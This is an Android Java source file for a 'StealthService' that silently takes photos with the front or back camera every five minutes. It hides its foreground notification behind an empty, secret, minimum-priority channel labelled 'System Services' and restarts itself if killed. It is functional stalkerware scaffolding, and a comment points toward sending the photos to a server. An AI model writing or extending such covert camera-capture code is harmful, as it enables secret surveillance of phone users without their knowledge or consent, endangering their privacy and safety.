// StealthService.java
package com.stealth.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class StealthService extends Service {

    private static final String CHANNEL_ID   = "system_service_ch";
    private static final int    NOTIF_ID     = 1;
    private static final long   CAPTURE_INTERVAL = 5 * 60 * 1000L; // every 5 minutes

    private CameraManager cameraManager;
    private Handler       handler;
    private Runnable      captureTask;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildSilentNotification());

        cameraManager = new CameraManager(this);
        handler        = new Handler(Looper.getMainLooper());

        // ✅ Schedule silent camera capture every 5 minutes
        captureTask = new Runnable() {
            @Override
            public void run() {
                capturePhotoSilently();
                handler.postDelayed(this, CAPTURE_INTERVAL);
            }
        };
        handler.post(captureTask);
    }

    // ✅ Silent camera capture — front cam first, fallback to back
    private void capturePhotoSilently() {
        if (!cameraManager.hasCameraPermission()) return;

        // Try front camera
        cameraManager.captureFrontCamera(new CameraManager.CaptureCallback() {
            @Override
            public void onPhotoCaptured(String filePath) {
                // Photo saved silently at: filePath
                // Send to server or store locally
            }

            @Override
            public void onError(String error) {
                // Front cam failed — try back cam
                cameraManager.captureBackCamera(new CameraManager.CaptureCallback() {
                    @Override
                    public void onPhotoCaptured(String filePath) {
                        // Back cam photo saved
                    }

                    @Override
                    public void onError(String err) {
                        // Both cameras failed — skip this interval
                    }
                });
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restart if killed by system
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && captureTask != null) {
            handler.removeCallbacks(captureTask);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableLights(false);
            channel.enableVibration(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildSilentNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build();
    }
}